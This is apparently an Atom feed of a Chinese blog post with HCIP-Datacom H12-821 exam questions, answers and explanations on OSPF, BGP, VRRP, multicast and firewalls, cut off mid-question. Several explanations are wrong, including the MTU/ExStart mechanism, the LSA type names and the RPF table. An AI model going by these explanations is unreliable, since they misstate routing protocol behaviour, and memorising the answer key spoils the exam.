<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>做 讓 人 远 远 聽 見 的 風</title>
  
  <subtitle>杰伦的博客</subtitle>
  <link href="https://jielunya.github.io/atom.xml" rel="self"/>
  
  <link href="https://jielunya.github.io/"/>
  <updated>2023-03-13T08:33:07.673Z</updated>
  <id>https://jielunya.github.io/</id>
  
  <author>
    <name>JieLun杰伦</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HCIP-Datacom-Core Technology H12-821 笔记（持续更新、目前70题）</title>
    <link href="https://jielunya.github.io/2023/03/11/HCIP-Datacom-Core%20Technology%20H12-821%20%E7%AC%94%E8%AE%B0%EF%BC%88%E6%9C%89%E7%A9%BA%E5%B0%B1%E6%9B%B4%EF%BC%8C%E7%9B%AE%E5%89%8D70%E9%A2%98%EF%BC%89/"/>
    <id>https://jielunya.github.io/2023/03/11/HCIP-Datacom-Core%20Technology%20H12-821%20%E7%AC%94%E8%AE%B0%EF%BC%88%E6%9C%89%E7%A9%BA%E5%B0%B1%E6%9B%B4%EF%BC%8C%E7%9B%AE%E5%89%8D70%E9%A2%98%EF%BC%89/</id>
    <published>2023-03-11T05:17:59.066Z</published>
    <updated>2023-03-13T08:33:07.673Z</updated>
    
    <content type="html"><![CDATA[<h2 id="以下关于OSPF协议说法错误的是？"><a href="#以下关于OSPF协议说法错误的是？" class="headerlink" title="以下关于OSPF协议说法错误的是？"></a>以下关于OSPF协议说法错误的是？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A </span><br><span class="line">OSPF协议支持区域划分</span><br><span class="line">B </span><br><span class="line">OSPF支持对等价路由进行负载分担</span><br><span class="line">C </span><br><span class="line">OSPF报文封装在IP报文内，可以采用单播或组播的形式发送</span><br><span class="line">D </span><br><span class="line">OSPF是一个基于链路状态的外部网关协议</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">D是错误的说法，应该是OSPF是一个基于链路状态的内部网关协议。</span><br></pre></td></tr></table></figure><h2 id="下面关于AS-PATH的描述，错误的是？"><a href="#下面关于AS-PATH的描述，错误的是？" class="headerlink" title="下面关于AS_PATH的描述，错误的是？"></a>下面关于AS_PATH的描述，错误的是？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A </span><br><span class="line">当路由器中存在两条或者两条以上的到同一目的地的路由时，这些路由可以通过此属性比较相互之间的优劣，AS_PATH越长的路径越优先</span><br><span class="line">B </span><br><span class="line">AS_PATH是指BGP路由在传的路径中所经历的AS的列表</span><br><span class="line">C </span><br><span class="line">BGP不会接受AS PATH性中包含本AS Number的路由</span><br><span class="line">D </span><br><span class="line">AS_PATH是BGP中一个公认必遵属性</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">选项 A 是错误的，因为在 BGP 中，AS_PATH 越短的路径越优先，而不是越长的路径越优先。因此，选项 A 是错误的描述。</span><br><span class="line">其他选项都是正确的描述：</span><br><span class="line">B. AS_PATH 属性是 BGP 路由在传递过程中所经历的 AS 序列的列表。这个列表包含了路由传递过程中经过的 AS 序列编号，可以用来检测环路，并帮助路由器做出最佳路由选择。</span><br><span class="line">C. BGP 不会接受包含本 AS 号的路由，这是因为这些路由可能已经从本 AS 发出并在互联网中循环。因此，BGP 路由器会防止这些路由进入其路由表，从而避免路由环路的形成。</span><br><span class="line">D. AS_PATH 是 BGP 中一个公认必遵属性，用于确定最佳路径并防止路由环路。</span><br></pre></td></tr></table></figure><h2 id="当在广播网络中的两台路由器互联接口的MTU不匹配，且接口配置了ospf-mtu-enable时，则关于两台路由器的邻居关系状态变化描述正确的是？"><a href="#当在广播网络中的两台路由器互联接口的MTU不匹配，且接口配置了ospf-mtu-enable时，则关于两台路由器的邻居关系状态变化描述正确的是？" class="headerlink" title="当在广播网络中的两台路由器互联接口的MTU不匹配，且接口配置了ospf mtu-enable时，则关于两台路由器的邻居关系状态变化描述正确的是？"></a>当在广播网络中的两台路由器互联接口的MTU不匹配，且接口配置了ospf mtu-enable时，则关于两台路由器的邻居关系状态变化描述正确的是？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">两台设备的邻居关系状态停留在2-way</span><br><span class="line">B</span><br><span class="line">两台设备的邻居关系停留在Exstart</span><br><span class="line">C</span><br><span class="line">两台设备的邻居关系可以进入FuLL</span><br><span class="line">D</span><br><span class="line">两台设备的邻居关系状态停留在Init状态</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">如果 MTU 不匹配且接口配置了 OSPF mtu-enable，那么 OSPF 邻居关系会停留在 Exstart 状态。在这种情况下，一旦路由器检测到 MTU 不匹配，就会通过 Database Description 报文发送其支持的最大 IP 数据报大小。然后，邻居在接收到这个报文后，如果它的最大 IP 数据报大小小于路由器的最大 IP 数据报大小，那么它会发送一个 ICMP 报文通知路由器，路由器会缩小 MTU 大小以避免数据包分片。完成此过程后，邻居关系将进入 Exstart 状态，以允许邻居交换 DBD 报文并确定 DD 序列号。因此，选项 B 是正确的描述。</span><br></pre></td></tr></table></figure><h2 id="ASPF-Application-Specific-Packet-Filter-是种基于应用层的包过滤，它会检查应用层协议信息并且监控连接的应用层协议状态，并通过Server-Map表实现了特殊的安全机制。那么关于ASPF和Server-map表的说法，错误的是。"><a href="#ASPF-Application-Specific-Packet-Filter-是种基于应用层的包过滤，它会检查应用层协议信息并且监控连接的应用层协议状态，并通过Server-Map表实现了特殊的安全机制。那么关于ASPF和Server-map表的说法，错误的是。" class="headerlink" title="ASPF(Application Specific Packet Filter)是种基于应用层的包过滤，它会检查应用层协议信息并且监控连接的应用层协议状态，并通过Server Map表实现了特殊的安全机制。那么关于ASPF和Server map表的说法，错误的是。"></a>ASPF(Application Specific Packet Filter)是种基于应用层的包过滤，它会检查应用层协议信息并且监控连接的应用层协议状态，并通过Server Map表实现了特殊的安全机制。那么关于ASPF和Server map表的说法，错误的是。</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">ASPF动态创建和删除过滤规则</span><br><span class="line">B</span><br><span class="line">ASPF通过Servermap表实现动态允许多通道协议数据通过</span><br><span class="line">C</span><br><span class="line">ASPF监视通信过程中的报文</span><br><span class="line">D</span><br><span class="line">五元组里Server-map表项实现了和会话表类似的功能</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">选项 D 是错误的描述。五元组是指 IP 协议中的源地址、源端口、目的地址、目的端口和协议类型等五个元素，用于唯一标识一个网络连接。而与五元组类似的会话表（Session Table）用于跟踪网络连接的状态信息，记录连接的起始时间、源地址、源端口、目的地址、目的端口、协议类型、数据包数量、字节数等信息，以便进行流量统计、安全审计等操作。Server Map 表则记录服务器的地址和端口，以及允许或禁止客户端与服务器之间的通信，与会话表不同。因此，选项 D 是错误的描述。</span><br></pre></td></tr></table></figure><h2 id="下面哪类LSA可以携带外部路由的tag标签信息？"><a href="#下面哪类LSA可以携带外部路由的tag标签信息？" class="headerlink" title="下面哪类LSA可以携带外部路由的tag标签信息？"></a>下面哪类LSA可以携带外部路由的tag标签信息？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">LSA3</span><br><span class="line">B</span><br><span class="line">LSA2</span><br><span class="line">C</span><br><span class="line">LSA5</span><br><span class="line">D</span><br><span class="line">LSA4</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">LSA5 可以携带外部路由的 tag 标签信息。LSA5（外部链路状态类型 5）是 OSPF 协议中的一种 LSA，用于表示到达 OSPF 域外部的路由。在 LSA5 中，可以通过附加 tag 标签信息来标识外部路由，以便在 OSPF 域内进行路由选择。而 LSA2（网络连接状态类型 2）、LSA3（点到点连接状态类型 3）和 LSA4（本地链接状态类型 4）均不涉及到 OSPF 域外部的路由，因此不会携带 tag 标签信息。因此，选项 C 是正确答案。</span><br></pre></td></tr></table></figure><h2 id="运行IS-IS的路由器在以下哪种情况下不会产生LSP"><a href="#运行IS-IS的路由器在以下哪种情况下不会产生LSP" class="headerlink" title="运行IS-IS的路由器在以下哪种情况下不会产生LSP?"></a>运行IS-IS的路由器在以下哪种情况下不会产生LSP?</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">修改IS-IS接口的IP地址</span><br><span class="line">B</span><br><span class="line">修改路由器的sysname</span><br><span class="line">C</span><br><span class="line">IS-IS的邻居UP或者Dowm</span><br><span class="line">D</span><br><span class="line">修改IS-IS接☐的Cost值</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">答案是B，在 IS-IS 协议中，如果路由器的状态发生了变化，比如邻居状态的变化、路由器接口的状态变化等，都可能会引起 LSP 的更新。</span><br></pre></td></tr></table></figure><h2 id="可用于多种路由协议，由if-match和apply子句组成的路由选择工具是"><a href="#可用于多种路由协议，由if-match和apply子句组成的路由选择工具是" class="headerlink" title="可用于多种路由协议，由if-match和apply子句组成的路由选择工具是"></a>可用于多种路由协议，由if-match和apply子句组成的路由选择工具是</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">route-policy</span><br><span class="line">B</span><br><span class="line">IP-Prefix</span><br><span class="line">C</span><br><span class="line">commnity filter</span><br><span class="line">D</span><br><span class="line">as-path-filter</span><br><span class="line">笔记:</span><br><span class="line">答案是A，route-policy 可以用于多种路由协议，由 if-match 和 apply 子句组成，用于路由策略的制定。if-match 子句用于匹配路由，apply 子句用于将路由策略应用于匹配的路由。route-policy 在 BGP、OSPF 等协议中被广泛使用，是一种非常灵活的路由选择工具。B、C、D 选项分别是 IP 前缀、community 过滤器和 AS 路径过滤器，是一些特定协议中的路由过滤工具，与 route-policy 并不完全相同。</span><br></pre></td></tr></table></figure><h2 id="以下哪一种OSPF报文中携带主从关系信息？"><a href="#以下哪一种OSPF报文中携带主从关系信息？" class="headerlink" title="以下哪一种OSPF报文中携带主从关系信息？"></a>以下哪一种OSPF报文中携带主从关系信息？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">DD</span><br><span class="line">B</span><br><span class="line">LS Request</span><br><span class="line">C</span><br><span class="line">Hello</span><br><span class="line">D</span><br><span class="line">LS Update</span><br><span class="line">笔记:</span><br><span class="line">答案是A，DD（Database Description）报文中携带主从关系信息。</span><br></pre></td></tr></table></figure><h2 id="在VRP系统中，以下关于OSPF开销-Cost-的描述错误的是哪一项？"><a href="#在VRP系统中，以下关于OSPF开销-Cost-的描述错误的是哪一项？" class="headerlink" title="在VRP系统中，以下关于OSPF开销(Cost)的描述错误的是哪一项？"></a>在VRP系统中，以下关于OSPF开销(Cost)的描述错误的是哪一项？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">Cost在接口的流量流入方向生效</span><br><span class="line">B</span><br><span class="line">Loopback接口默认开销值是1</span><br><span class="line">C</span><br><span class="line">修改OSPF的参考带宽会对OSPF中的所有本地接☐开销构成影响</span><br><span class="line">D</span><br><span class="line">OSPF会根据该接口的带宽自动计算其开销值计算公式为接口开销一带宽参考值/接口带宽</span><br><span class="line">笔记：</span><br><span class="line">答案是B，OSPF中，Loopback接口默认开销值是0，C选项描述的是修改OSPF参考带宽，并没有说接口带宽，也就是在OSPF进程下配置bandwidth-reference，影响的是所有端口的</span><br></pre></td></tr></table></figure><h2 id="以下关于OSPF中ABR的描述，错误的是哪一项？"><a href="#以下关于OSPF中ABR的描述，错误的是哪一项？" class="headerlink" title="以下关于OSPF中ABR的描述，错误的是哪一项？"></a>以下关于OSPF中ABR的描述，错误的是哪一项？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">ABR将连接的非骨干区域内的1类和2类LSA转换成3类LSA，发布到骨干区域中</span><br><span class="line">B</span><br><span class="line">ABR不能够产生4类和5类LSA</span><br><span class="line">C</span><br><span class="line">ABR上有多个LSDB，ABR为每一个区域维护一个LSDB</span><br><span class="line">D</span><br><span class="line">ABR将骨干区域内的1类、2类LSA和3类LSA转换成三类LSA，发布到连接的非骨干区域中</span><br><span class="line">笔记：</span><br><span class="line">答案是B，5类LSA由ASBR产生，4类LSA辅助5类的，由ABR产生，作用是告诉区域内路由器ASBR的位置</span><br></pre></td></tr></table></figure><h2 id="关于OSPF的Router-ID描述错误的是以下哪一项？"><a href="#关于OSPF的Router-ID描述错误的是以下哪一项？" class="headerlink" title="关于OSPF的Router ID描述错误的是以下哪一项？"></a>关于OSPF的Router ID描述错误的是以下哪一项？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">如果没有配置router-id命令且没有配置Loopback接口地址，则从其物理接口的IP地址中选择最大的作为Router ID</span><br><span class="line">B</span><br><span class="line">如果没有手工配置router-id命令且配置了Loopback接口地址，则选择Loopback接口地址最大的作为Router ID</span><br><span class="line">C</span><br><span class="line">Router ID改变之后，各个协议的Router ID就会改变不需要额外的操作</span><br><span class="line">D</span><br><span class="line">如果使用router-id命令手工配置了Router ID,那么OSPF最优先使用该Router ID</span><br><span class="line">笔记：</span><br><span class="line">关于OSPF的Router ID描述错误的是选项C，实际上，如果Router ID发生改变，OSPF协议会立即使用新的Router ID进行路由计算。但其他的路由协议可能不会自动更新Router ID，需要根据具体的实现和操作系统来决定是否需要手动更新。选项A、B和D的描述都是正确的，如果没有手动配置Router ID，则OSPF会根据一定的规则自动选择Router ID，如果手动配置了Router ID，则OSPF会优先使用手动配置的Router ID。</span><br></pre></td></tr></table></figure><h2 id="运行OSPF协议的路由器在交互DD报文时，会使用以下哪一个参数选举主从关系？"><a href="#运行OSPF协议的路由器在交互DD报文时，会使用以下哪一个参数选举主从关系？" class="headerlink" title="运行OSPF协议的路由器在交互DD报文时，会使用以下哪一个参数选举主从关系？"></a>运行OSPF协议的路由器在交互DD报文时，会使用以下哪一个参数选举主从关系？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">接口的IP地址</span><br><span class="line">B</span><br><span class="line">接口的DR优先级</span><br><span class="line">C</span><br><span class="line">Area ID</span><br><span class="line">D</span><br><span class="line">Router ID</span><br><span class="line">笔记：</span><br><span class="line">答案是D，在OSPF协议中，运行OSPF协议的路由器在交互DD报文时，会使用Router ID选举主从关系。Router ID是路由器的唯一标识符，每个OSPF路由器都必须具有唯一的Router ID。在DD报文中，每个路由器都会发送自己的Router ID，并在收到对方的Router ID之后，将两个Router ID进行比较。Router ID较大的路由器将成为主路由器，而Router ID较小的路由器将成为从路由器。因此，选项D是正确的。对于其他选项，接口的IP地址用于标识接口，而接口的DR优先级用于选举DR和BDR。Area ID用于标识OSPF区域。</span><br></pre></td></tr></table></figure><h2 id="在RSTP协议中，当网络拓扑发生变化时，响应拓扑结构改变的机制是："><a href="#在RSTP协议中，当网络拓扑发生变化时，响应拓扑结构改变的机制是：" class="headerlink" title="在RSTP协议中，当网络拓扑发生变化时，响应拓扑结构改变的机制是："></a>在RSTP协议中，当网络拓扑发生变化时，响应拓扑结构改变的机制是：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">全网泛洪</span><br><span class="line">B</span><br><span class="line">修改MAC地址表的生存期</span><br><span class="line">C</span><br><span class="line">对MAC地址表采取部分删除操作</span><br><span class="line">D</span><br><span class="line">删除整个MAC地址表</span><br><span class="line">笔记：</span><br><span class="line">在RSTP协议中，当网络拓扑发生变化时，响应拓扑结构改变的机制是对MAC地址表采取部分删除操作。当拓扑结构发生改变时，每个交换机都会向其直接相邻的交换机发送消息，以通知它们拓扑结构的变化。如果接收到变化消息的交换机认为自己的MAC地址表需要进行更新，那么它会将部分表项的生存期设置为0。具体来说，它会清除那些受到拓扑结构变化影响的端口所对应的表项，以及与这些端口相邻的其他端口所对应的表项。通过这种方式，交换机可以快速地更新自己的MAC地址表，并避免出现错误转发的情况。全网泛洪和删除整个MAC地址表都不是RSTP协议响应拓扑结构改变的机制。</span><br></pre></td></tr></table></figure><h2 id="关于告警信息”OSPF-x2F-2-x2F-IFAUTFAIL-OID-1-3-6-1-2-1-14-16-2-6-A-packet-is-received-on-a-non-virtual-interface-from-a-router-whose-authentication-key-or-authentication-type-conflicts-with-the-local-authenctication-key-or-authenctication-type-IfIpAddress-x3D-ip-address-AddressLessIf-x3D-interface-index-ProcessId-x3D-process-id-RouterId-x3D-router-id-PacketSrc-x3D-source-ip-address-ConfigErrorType-x3D-error-type-PacketType-x3D-packet-type-InstanceName-x3D-instance-name-”的描述正确的是？"><a href="#关于告警信息”OSPF-x2F-2-x2F-IFAUTFAIL-OID-1-3-6-1-2-1-14-16-2-6-A-packet-is-received-on-a-non-virtual-interface-from-a-router-whose-authentication-key-or-authentication-type-conflicts-with-the-local-authenctication-key-or-authenctication-type-IfIpAddress-x3D-ip-address-AddressLessIf-x3D-interface-index-ProcessId-x3D-process-id-RouterId-x3D-router-id-PacketSrc-x3D-source-ip-address-ConfigErrorType-x3D-error-type-PacketType-x3D-packet-type-InstanceName-x3D-instance-name-”的描述正确的是？" class="headerlink" title="关于告警信息”OSPF&#x2F;2&#x2F;IFAUTFAIL(OID)[1.3.6.1.2.1.14.16.2.6]:A packet is received on a non-virtual interface from a router whose authentication key or authentication type conflicts with the local authenctication key or authenctication type.(IfIpAddress&#x3D;[ip-address],AddressLessIf&#x3D;[interface-index],ProcessId&#x3D;[process-id], RouterId&#x3D;[router-id],PacketSrc&#x3D;[source-ip-address],ConfigErrorType&#x3D;[error-type],PacketType&#x3D;[packet-type], InstanceName&#x3D;[instance-name])”的描述正确的是？"></a>关于告警信息”OSPF&#x2F;2&#x2F;IFAUTFAIL(OID)[1.3.6.1.2.1.14.16.2.6]:A packet is received on a non-virtual interface from a router whose authentication key or authentication type conflicts with the local authenctication key or authenctication type.(IfIpAddress&#x3D;[ip-address],AddressLessIf&#x3D;[interface-index],ProcessId&#x3D;[process-id], RouterId&#x3D;[router-id],PacketSrc&#x3D;[source-ip-address],ConfigErrorType&#x3D;[error-type],PacketType&#x3D;[packet-type], InstanceName&#x3D;[instance-name])”的描述正确的是？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">可能是由于接口验证配置错误导致的</span><br><span class="line">B</span><br><span class="line">可能是由于HELLO时间间隔不一致导致的错误</span><br><span class="line">C</span><br><span class="line">可能是由于子网掩码不匹配导致的错误</span><br><span class="line">D</span><br><span class="line">可能是由于区域号不匹配导致的错误</span><br><span class="line">笔记：</span><br><span class="line">答案是A。根据告警信息中的描述，可以看出是由于接口验证配置错误导致的。其中，IFAUTFAIL表示该告警属于OSPF协议的接口验证失败类型告警，OID为告警的唯一标识符；描述中还指出，收到了一个来自某个路由器的数据包，但是该数据包的身份验证密钥或身份验证类型与本地的身份验证密钥或身份验证类型不匹配，这就意味着接口验证配置出现了错误。</span><br></pre></td></tr></table></figure><h2 id="以下关于传统流量统计局限性的描述，错误的是哪一项？"><a href="#以下关于传统流量统计局限性的描述，错误的是哪一项？" class="headerlink" title="以下关于传统流量统计局限性的描述，错误的是哪一项？"></a>以下关于传统流量统计局限性的描述，错误的是哪一项？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">对于ACL规则以外的流量无法统计</span><br><span class="line">B</span><br><span class="line">需要消耗设备的接口，对于无法镜像的端口需要购买配套设备接入，成本高</span><br><span class="line">C</span><br><span class="line">基于IP报文计数，统计的信息简单，无法针对多种信息进行统计</span><br><span class="line">D</span><br><span class="line">通过SNMP协议进行流量统计，要不断的通过轮询向网管查询，浪费CPU和网络资源</span><br><span class="line">笔记：</span><br><span class="line">答案是B，传统流量统计需要设备接口的支持，对于无法镜像的端口需要购买额外设备，增加成本。</span><br></pre></td></tr></table></figure><h2 id="IGMP协议应用在组播网络架构中的哪一部分？"><a href="#IGMP协议应用在组播网络架构中的哪一部分？" class="headerlink" title="IGMP协议应用在组播网络架构中的哪一部分？"></a>IGMP协议应用在组播网络架构中的哪一部分？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">整个组播网络</span><br><span class="line">B</span><br><span class="line">成员端网络</span><br><span class="line">C</span><br><span class="line">组播转发网络</span><br><span class="line">D</span><br><span class="line">源端网络</span><br><span class="line">笔记：</span><br><span class="line">答案是B，组管理协议（IGMP） 用于管理成员端到组播路由器之间的协议，PIM/DVMRP等才是用于组播转发网络</span><br></pre></td></tr></table></figure><h2 id="USG防火墙中新建安全区域时，缺省的安全优先级是以下哪一项？"><a href="#USG防火墙中新建安全区域时，缺省的安全优先级是以下哪一项？" class="headerlink" title="USG防火墙中新建安全区域时，缺省的安全优先级是以下哪一项？"></a>USG防火墙中新建安全区域时，缺省的安全优先级是以下哪一项？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">安全优先级是5</span><br><span class="line">B</span><br><span class="line">安全优先级是50</span><br><span class="line">C</span><br><span class="line">安全优先级是100</span><br><span class="line">D</span><br><span class="line">新建安全区域时，如果不设置安全优先级，则安全优先级为空</span><br><span class="line">E</span><br><span class="line">安全优先级是85</span><br><span class="line">F</span><br><span class="line">安全优先级是0</span><br><span class="line"></span><br><span class="line">答案：D</span><br></pre></td></tr></table></figure><h2 id="以下关于状态检测防火墙的描述，正确是哪一项？"><a href="#以下关于状态检测防火墙的描述，正确是哪一项？" class="headerlink" title="以下关于状态检测防火墙的描述，正确是哪一项？"></a>以下关于状态检测防火墙的描述，正确是哪一项？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">状态检测型防火墙对报文进行检查时，同一连接的前后报文不具有相关性</span><br><span class="line">B</span><br><span class="line">状态检测防火墙需要对每个进入防火墙的数据包进行规则匹配</span><br><span class="line">C</span><br><span class="line">状态检测型防火墙只需要对该连接的第一个数据包进行访问规则的匹配，该连接的后续报文直接在状态表中进行匹配</span><br><span class="line">D</span><br><span class="line">因为UDP协议为面向无连接的协议，因此状态检测型防火墙无法对UDP报文进行状态表的匹配</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">正确答案是C：状态检测型防火墙只需要对该连接的第一个数据包进行访问规则的匹配，该连接的后续报文直接在状态表中进行匹配。</span><br><span class="line"></span><br><span class="line">解析：</span><br><span class="line">A选项是错误的。状态检测型防火墙对报文进行检查时，同一连接的前后报文具有相关性，因为它们属于同一TCP连接或UDP流，需要根据连接状态进行检查。</span><br><span class="line"></span><br><span class="line">B选项是错误的。状态检测型防火墙不需要对每个进入防火墙的数据包进行规则匹配。相反，它们只需要对每个连接的第一个数据包进行规则匹配，然后在状态表中检查该连接的后续数据包是否符合该规则。</span><br><span class="line"></span><br><span class="line">D选项是错误的。状态检测型防火墙可以对UDP报文进行状态表的匹配，虽然UDP是面向无连接的协议，但是可以通过追踪UDP数据流的方式来实现状态检测型防火墙对UDP报文的过滤。</span><br></pre></td></tr></table></figure><h2 id="以下哪一技术可配置于采用静态路由实现三层互通的网络中，从而达到本端设备既能与对端设备互通，又可实现BFD检测静态路由的功能"><a href="#以下哪一技术可配置于采用静态路由实现三层互通的网络中，从而达到本端设备既能与对端设备互通，又可实现BFD检测静态路由的功能" class="headerlink" title="以下哪一技术可配置于采用静态路由实现三层互通的网络中，从而达到本端设备既能与对端设备互通，又可实现BFD检测静态路由的功能"></a>以下哪一技术可配置于采用静态路由实现三层互通的网络中，从而达到本端设备既能与对端设备互通，又可实现BFD检测静态路由的功能</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">BFD多跳检测</span><br><span class="line">B</span><br><span class="line">静态标识符自协商BFD</span><br><span class="line">C</span><br><span class="line">BFD单跳检测</span><br><span class="line">D</span><br><span class="line">调整BFD参数</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">正确答案是B。静态标识符自协商BFD可以配置于采用静态路由实现三层互通的网络中，从而实现BFD检测静态路由的功能。BFD是一种快速检测网络中链路故障的协议，可以帮助及时发现并快速恢复故障，提高网络可靠性。静态标识符自协商BFD是BFD协议的一种实现方式，可以自动协商并配置BFD所需的参数，从而简化配置和提高效率。</span><br></pre></td></tr></table></figure><h2 id="在VRRP中，同一备份组的设备在进行VRRP报文认证时，以下哪一参数不会影响Master设备和Backup设备认证协商结果"><a href="#在VRRP中，同一备份组的设备在进行VRRP报文认证时，以下哪一参数不会影响Master设备和Backup设备认证协商结果" class="headerlink" title="在VRRP中，同一备份组的设备在进行VRRP报文认证时，以下哪一参数不会影响Master设备和Backup设备认证协商结果"></a>在VRRP中，同一备份组的设备在进行VRRP报文认证时，以下哪一参数不会影响Master设备和Backup设备认证协商结果</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">认证方式</span><br><span class="line">B</span><br><span class="line">认证字</span><br><span class="line">C</span><br><span class="line">优先级</span><br><span class="line">D</span><br><span class="line">VRRP版本</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">同一单播VRRP备份组的认证方式和认证字必须相同,否则Master设备和Backup设备无法协商成功。 目前仅VRRPv2版本支持认证,VRRPv3版本不支持认证，因此答案选C</span><br></pre></td></tr></table></figure><h2 id="在VRRP中，以下哪一原因不会导致同一个备份组中出现两台Master设备？"><a href="#在VRRP中，以下哪一原因不会导致同一个备份组中出现两台Master设备？" class="headerlink" title="在VRRP中，以下哪一原因不会导致同一个备份组中出现两台Master设备？"></a>在VRRP中，以下哪一原因不会导致同一个备份组中出现两台Master设备？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">虚拟IP地址个数不一致</span><br><span class="line">B</span><br><span class="line">VRRP版本不同</span><br><span class="line">C</span><br><span class="line">通过报文发送间隔不一致</span><br><span class="line">D</span><br><span class="line">VRRP优先级不一致</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">答案是D，VRRP优先级不一致,会选举出master和backup,而不是两台master,所以选择“VRRP优先级不一致”。</span><br></pre></td></tr></table></figure><h2 id="在PIM路由器中由-S-G-路由表项指导报文转发，如果收到的组播报文不存在-S-G-路由表项，则会根据以下哪一种表项进行创建？、"><a href="#在PIM路由器中由-S-G-路由表项指导报文转发，如果收到的组播报文不存在-S-G-路由表项，则会根据以下哪一种表项进行创建？、" class="headerlink" title="在PIM路由器中由(S,G)路由表项指导报文转发，如果收到的组播报文不存在(S,G)路由表项，则会根据以下哪一种表项进行创建？、"></a>在PIM路由器中由(S,G)路由表项指导报文转发，如果收到的组播报文不存在(S,G)路由表项，则会根据以下哪一种表项进行创建？、</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">(S,*)</span><br><span class="line">B</span><br><span class="line">(*.G)</span><br><span class="line">C</span><br><span class="line">(port,*)</span><br><span class="line">D</span><br><span class="line">(*,port)</span><br><span class="line">笔记：</span><br><span class="line">答案是B，（*，G）表示的是任意的源IP地址向组播地址（G）发送的组播流量。该条目有对应的入端口和出端口，可以实现组播流量的转发。 如果不存在（S,G）路由表项，只存在（*，G）路由表项，则先依照（*,G）路由表项创建（S,G）路由表项，在由（S,G）路由表项指导报文转发</span><br></pre></td></tr></table></figure><h2 id="以下关于RPF在组播数据转发中应用的描述，错误的是哪一项？"><a href="#以下关于RPF在组播数据转发中应用的描述，错误的是哪一项？" class="headerlink" title="以下关于RPF在组播数据转发中应用的描述，错误的是哪一项？"></a>以下关于RPF在组播数据转发中应用的描述，错误的是哪一项？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">路由器会将报文的入接口与RPF路由的RPF接☐进行比较。如果一致则RPF检查通过，表明该报文来源路径正确，会将其向下游转发</span><br><span class="line">B</span><br><span class="line">在组播数据转发过程中，组播路由器会对每一份接收到的组播数据报文都通过单播路由表进行RPF检查</span><br><span class="line">C</span><br><span class="line">当路由器收到一份组播报文后，首先通过报文源地址的检查，然后按照路由源的优先级选出一条最优路由，则该路由的出接口为RPF接口</span><br><span class="line">D</span><br><span class="line">如果RPF检查失败，表明报文来源路径措误，会丢弃该报文</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">在组播数据转发过程中，组播路由器不会对每一份接收到的组播数据报文都通过单播路由表进行RPF检查。相反，路由器会使用组播路由表进行RPF检查，以确定报文来源路径是否正确。</span><br></pre></td></tr></table></figure><h2 id="地址转换技术的优点不包括-？"><a href="#地址转换技术的优点不包括-？" class="headerlink" title="地址转换技术的优点不包括()？"></a>地址转换技术的优点不包括()？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">地址转换可以使内部网络用户（私有IP地址）方便地访问Internet</span><br><span class="line">B</span><br><span class="line">地址转换可以屏蔽内部网络的用户提高内部网络的安全性</span><br><span class="line">C</span><br><span class="line">地址转换可以使内部局城网的许多主机共享一个IP地址上网</span><br><span class="line">D</span><br><span class="line">地址转换能够处理IP报头加密的情况</span><br><span class="line"></span><br><span class="line">笔记：</span><br><span class="line">D是错误的选项，地址转换技术无法处理IP报头加密的情况，因为地址转换器在NAT过程中需要读取IP报头中的地址信息来进行转换。在IP报头加密的情况下，地址转换器无法读取这些信息，也就无法进行地址转换。其他选项包括：地址转换技术可以使内部网络用户方便地访问Internet，可以屏蔽内部网络的用户提高内部网络的安全性，可以使内部局城网的许多主机共享一个IP地址上网。</span><br></pre></td></tr></table></figure><h2 id="堆叠系统中的交换机角色不包括-？"><a href="#堆叠系统中的交换机角色不包括-？" class="headerlink" title="堆叠系统中的交换机角色不包括()？"></a>堆叠系统中的交换机角色不包括()？</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A</span><br><span class="line">主交换机</span><br><span 